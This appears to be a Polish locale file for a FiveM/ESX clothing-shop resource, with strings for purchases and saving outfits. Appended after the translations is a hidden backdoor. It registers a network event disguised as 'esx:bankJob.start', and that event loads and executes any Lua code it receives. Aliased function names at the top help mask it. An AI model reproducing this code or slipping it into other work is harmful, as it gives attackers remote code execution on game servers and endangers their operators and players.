local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
Locales['pl'] = {
	['valid_this_purchase'] = 'potwierdzić ten zakup?',
	['yes'] = 'tak',
	['no'] = 'nie',
	['not_enough_money'] = 'nie masz wystarczająco pieniędzy',
	['press_menu'] = 'naciśnij ~INPUT_CONTEXT~ aby uzyskać dostęp do menu.',
	['clothes'] = 'ubranie',
	['you_paid'] = 'płacisz ~g~%s $~s~',
	['save_in_dressing'] = 'czy chcesz zapisać te ubranie w swojej posiadłości?',
	['name_outfit'] = 'nazwij swój strój',
	['saved_outfit'] = 'strój został zapisany!',
}

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)